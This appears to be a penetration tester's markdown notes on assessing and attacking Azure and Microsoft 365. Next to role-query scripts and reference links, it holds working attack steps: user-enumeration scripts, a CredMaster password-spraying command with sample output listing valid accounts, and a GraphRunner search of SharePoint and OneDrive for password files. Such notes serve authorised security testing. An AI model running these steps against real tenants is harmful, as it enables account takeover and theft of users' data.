# All things about Azure & M365

## Tools & Documentation
Collections:   
- https://github.com/Kyuu-Ji/Awesome-Azure-Pentest

Assess Azure Security:   
- AzureHound https://github.com/BloodHoundAD/AzureHound
- Stormspotter https://github.com/Azure/Stormspotter
- PowerZure https://github.com/hausec/PowerZure

Attacking / Lateral Movement:   
- MicroBurst: https://github.com/NetSPI/MicroBurst
- Lava https://github.com/mattrotlevi/lava
- GraphRunner: https://github.com/dafthack/GraphRunner

DFIR / Detect Compromise:   
- Sparrow https://github.com/cisagov/Sparrow

Other:
- MSIdentityTools: https://www.powershellgallery.com/packages/MSIdentityTools/2.0.20?s=03

## Recon
Get tenant information (e.g. tenantId:   
`Invoke-AADIntReconAsOutsider -DomainName example.com`   

### Storage services
Enumerate azure file resources (using MicroBurst):   
`Invoke-EnumerateAzureBlobs -Base <keyword>`   

## Roles and Permissions
* Graph permissions reference: https://docs.microsoft.com/en-us/graph/permissions-reference#all-permissions-and-ids
* Azure AD permission reference: https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference
* Azure RBAC roles reference: https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles

##  Service Principals
There are three types of Service Principals:   

*Application* - The type of service principal is the local representation, or application instance, of a global application object in a single tenant or directory. In this case, a service principal is a concrete instance created from the application object and inherits certain properties from that application object. A service principal is created in each tenant where the application is used and references the globally unique app object. The service principal object defines what the app can actually do in the specific tenant, who can access the app, and what resources the app can access.
When an application is given permission to access resources in a tenant (upon registration or consent), a service principal object is created. When you register an application using the Azure portal, a service principal is created automatically. You can also create service principal objects in a tenant using Azure PowerShell, Azure CLI, Microsoft Graph, and other tools.

*Managed identity* - This type of service principal is used to represent a managed identity. Managed identities eliminate the need for developers to manage credentials. Managed identities provide an identity for applications to use when connecting to resources that support Azure AD authentication. When a managed identity is enabled, a service principal representing that managed identity is created in your tenant. Service principals representing managed identities can be granted access and permissions, but cannot be updated or modified directly.

*Legacy* - This type of service principal represents a legacy app, which is an app created before app registrations were introduced or an app created through legacy experiences. A legacy service principal can have credentials, service principal names, reply URLs, and other properties that an authorized user can edit, but does not have an associated app registration. The service principal can only be used in the tenant where it was created.

# Querying data with PowerShell

## Querying Roles and Permissions
### Azure AD Roles
Get all roles and their members:   
`Get-AzureADDirectoryRole | % { $rolemembers = Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId; if($rolemembers.count -gt 0){ Write-output "`r`n`r`nMembers of $($_.DisplayName):"; $rolemembers | Get-AzureADUser } }`   

*Query Azure RBAC Roles for Service Principals*   
```powershell
$ResourceGroupServicePrincipalRoles = Get-AzRoleAssignment -ResourceGroupName $RG.ResourceGroupName | where-Object { $_.ObjectType -eq "ServicePrincipal" }
foreach($RGSPR in $ResourceGroupServicePrincipalRoles){
    Get-AzADServicePrincipal -ObjectId $RGSPR.ObjectId
}
```
*Query Graph API Roles for Service Principals*   
```powershell
$ServicePrincipals = Get-AzureADServicePrincipal -All $true
foreach($ServicePrincipal in $ServicePrincipals){
    Get-AzureADServiceAppRoleAssignedTo -ObjectId $ServicePrincipal.ObjectId | Where-Object {$_.ResourceDisplayName -eq "Microsoft Graph"}
}
```

## Script to Query RBAC, AzureAD and MS Graph API Role Assignments
First run the script to export all assignments to a file:   
[Export_AzureAD-RBAC-RoleAssignments.ps1](Export_AzureAD-RBAC-RoleAssignments.ps1)   
Afterwards, you can define a scope and e.g. get all RBAC roles which affect the given scope:
```powershell
$azureRBACRoles = Get-Content .\29_03_2023-10_23_09_AzRoleAssignments.csv | ConvertFrom-Csv
$scope = "/subscriptions/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/resourceGroups/rg_test/providers/Microsoft.Storage/storageAccounts/stgacctest"
$azureRBACRoles | where-object { $scope -like "$($_ | select -ExpandProperty Scope)*" }
```
Azure AD roles and MS Graph permissions have to be verified manually. (Check for highly privileged roles etc.)

## Microsoft Graph API
Microsoft Graph API base URL: https://graph.microsoft.com   
Microsoft Graph API supports two types of authorization:
* Application-level authorization - There is no signed-in user (for example, a SIEM scenario). The permissions granted to the application determine authorization.
* User delegated authorization - A user who is a member of the Azure AD tenant is signed in. The user must be a member of an Azure AD Limited Admin role - either Security Reader or Security Administrator - in addition to the application having been granted the required permissions.

### Granting permissions to an application
The application registration only defines which permission the application requires - it does not grant these permissions to the application. An Azure AD tenant administrator must explicitly grant these permissions by making a call to the admin consent endpoint.   

Note: This grants permissions to the application - not to users. This means that all users belonging to the Azure AD tenant that use this application will be granted these permissions - even non-admin users!   

### Linking Graph URIs and PS cmdlets
| MS Graph API | PowerShell Cmdlet|
| ------------ | ----------------- |
| /v1.0/applications | Get-AzADApplication |
| /v1.0/servicePrincipals | Get-AzADServicePrincipal |
| /v1.0/users | Get-AzADUser |
| /v1.0/servicePrincipals/{ServicePrincipalID}/appRoleAssignments | Get-AzRoleAssignment |

## MgGraph PS Module
Connect using MgGraph module, and specifying required scopes (permissions):   
```powershell
Connect-MgGraph -TenantId $tenantId
$RequiredScopes = @("UserActivity.ReadWrite.CreatedByApp", "Directory.ReadWrite.All")
Connect-MgGraph -Scopes $RequiredScopes
```
Find commands specific to a url:   
`Find-MgGraphCommand -uri "/users/{id}/activities"`   

## Azure Token Cache
The powershell contexts are stored in: `$env:USERPROFILE\.Azure`   

# Misc
## Azure Debug Shells & APIs
From: https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95   
### App Service Host API
URL: `https://$($app.Name).scm.azurewebsites.net/api/command`   

### App Service Debug Shells
**Linux**
![linux ssh shell](/images/azure_webapp-debugconsole-linux.png)

**Windows**
![windows ssh shell](/images/azure_webapp-debugconsole.png)

## Azure Datacenter IPs
You can list all IP Address prefixes for Azure services for a specific region:   
```powershell
$serviceTags = Get-AzNetworkServiceTag -Location NorthEurope
$serviceTags.values.properties.Addressprefixes
```

# OSINT
## User Enum
### GetCredentialType
```powershell
$users=@("aaa@abcdef.onmicrosoft.com","user1@abcdef.onmicrosoft.com")
# Loop trough all users
foreach($user in $users)
{
    $exists = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/GetCredentialType" -ContentType "application/json" -Method POST -Body (@{"username"="$user"; "isOtherIdpSupported" =  $true}|ConvertTo-Json) | Select -ExpandProperty IfExistsResult
    $properties = [ordered]@{"Username"=$user; "Exists"=$($exists -eq 0 -or $exists -eq 6)}
    New-Object -TypeName PSObject -Property $properties
}
```
### OneDrive based User Enum
It is possible to check if a user exists by sending a HTTP HEAD request to a onedrive url. The format of the url is always:   
 `https://company-my.sharepoint.com/personal/username_domain_tld`   
Note: Dots (.) and at (@) have to be replaced with underscore (_).

# PW Spraying
## CredMaster
https://github.com/knavesec/CredMaster/   
Using the credmaster tool, the module msol can be for example used to identify valid passwords:    
```python 
$ python3 credmaster.py --access_key <AWS_ACCESSKEY> --secret_access_key <AWS_SECRETKEY> --plugin msol -u /home/kali/Desktop/users.txt -p /home/kali/Desktop/passlist.txt -a /home/kali/Desktop/useragent.txt -o /home/kali/Desktop/credmasterout4 -t 5 -j 20 -m 10 -d 30 --passwordsperdelay 3
[ ... ]
[2023-10-05 09:33:41.481] Loading credentials from /home/kali/Desktop/testusers.txt with password xxxxxxx!
[2023-10-05 09:33:54.211] eu-west-3: [+] SUCCESS: camilo.rojo@testdomain.onmicrosoft.com:xxxxxxx! - NOTE: The response indicates MFA (Microsoft) is in use
[2023-10-05 09:33:55.463] us-east-2: [-] FAILURE: Invalid username or password. Username: cedomir.sekulic@testdomain.onmicrosoft.com could exist
[2023-10-05 09:33:55.544] us-west-2: [+] SUCCESS: jarl.gietema@testdomain.onmicrosoft.com:xxxxxxx!
[2023-10-05 09:33:57.328] us-west-1: [-] FAILURE: Invalid username or password. Username: marc.hall@testdomain.onmicrosoft.com could exist
[2023-10-05 09:33:58.035] us-east-1: [-] FAILURE: Invalid username or password. Username: wallace.sims@testdomain.onmicrosoft.com could exist
[2023-10-05 09:34:08.933] eu-west-3: [-] FAILURE: Invalid username or password. Username: alyssa.laurent@testdomain.onmicrosoft.com could exist
[2023-10-05 09:34:09.825] us-west-1: [-] FAILURE: Invalid username or password. Username: nathan.patel@testdomain.onmicrosoft.com could exist
[ ... ]
[2023-10-05 09:34:58.271] End Time: 2023-10-05 09:34:58.271320
[2023-10-05 09:34:58.272] Total Execution: 89.247289 seconds
[2023-10-05 09:34:58.272] Valid credentials identified: 2
[2023-10-05 09:34:58.272] VALID - camilo.rojo@testdomain.onmicrosoft.com:xxxxxxx!
[2023-10-05 09:34:58.272] VALID - jarl.gietema@testdomain.onmicrosoft.com:xxxxxxx!
Files used in parameters:

- users.txt → list of emails, one per line (e.g. matti.meikalainen@domain.fi)
- passlist.txt → list of passwords to test
- useragent.txt → list of useragents, e.g. taken from: https://github.com/knavesec/CredMaster/blob/master/useragents.txt

# File Search in SharePoint and OneDrive
## GraphRunner
```powershell
# First get tokens
Get-GraphTokens
# Now search for keywords
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm pass*
```
